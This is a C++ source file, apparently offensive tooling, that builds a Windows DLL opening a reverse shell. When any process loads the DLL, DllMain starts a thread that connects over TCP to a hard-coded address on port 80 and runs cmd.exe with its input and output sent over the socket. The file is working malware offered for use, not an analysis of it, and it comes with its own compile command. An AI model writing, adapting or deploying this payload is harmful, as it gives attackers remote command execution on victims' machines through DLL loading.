#################################A Project By John Fawcett 5HR3K################################
################################ Compile with this x86_64-w64-mingw32-gcc 5HR3KDLL1.cpp --shared -o 5HR3KDLL1.dll -lws2_32###########################
include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

// Worker thread that does all the network and process stuff
DWORD WINAPI WorkerThread(LPVOID lpParam)
{
    WSADATA wsaData;
    SOCKET Winsock;
    struct sockaddr_in hax;
    STARTUPINFOA ini_processo;
    PROCESS_INFORMATION processo_info;

    char ip_addr[16] = "192.168.123.123";
    char port[6] = "80";

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
        return 1;

    // Create TCP socket
    Winsock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (Winsock == INVALID_SOCKET)
        return 1;

    // Setup server address
    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    // Connect to server
    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    // Setup STARTUPINFO to redirect handles
    ZeroMemory(&ini_processo, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES;
    ini_processo.hStdInput =
    ini_processo.hStdOutput =
    ini_processo.hStdError = (HANDLE)Winsock;

    // Launch cmd.exe
    CreateProcessA(
        NULL,
        (LPSTR)"cmd.exe",
        NULL,
        NULL,
        TRUE,
        0,
        NULL,
        NULL,
        &ini_processo,
        &processo_info
    );

    return 0;
}
 
// Clean DllMain using your preferred format
BOOL APIENTRY DllMain(
    HMODULE hModule,             // Handle to DLL module
    DWORD ul_reason_for_call,    // Reason for calling function
    LPVOID lpReserved            // Reserved
)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL
            DisableThreadLibraryCalls(hModule); // Optional, prevents thread notifications

            // Spawn worker thread for network/process logic
            CreateThread(NULL, 0, WorkerThread, NULL, 0, NULL);
            break;

        case DLL_THREAD_ATTACH:  // A new thread is being created
            break;

        case DLL_THREAD_DETACH:  // A thread is exiting
            break;

        case DLL_PROCESS_DETACH: // A process unloads the DLL
            break;
    }
    return TRUE;
}
